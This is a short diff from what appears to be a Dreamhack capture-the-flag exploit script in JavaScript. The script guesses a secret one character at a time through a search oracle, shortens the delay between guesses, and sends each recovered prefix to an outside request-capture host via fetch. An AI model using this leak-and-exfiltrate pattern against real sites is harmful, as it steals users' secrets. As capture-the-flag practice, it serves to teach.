@@ -40,7 +40,7 @@
                     let found = false;
 
                     for (let c of chars) {
-                        await sleep(300);
+                        await new Promise(resolve => setTimeout(resolve, 100)); // Delay to avoid rate limiting
                         if (await search(secret + c)) {
                             secret += c;
                             fetch(`https://gubujkt.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
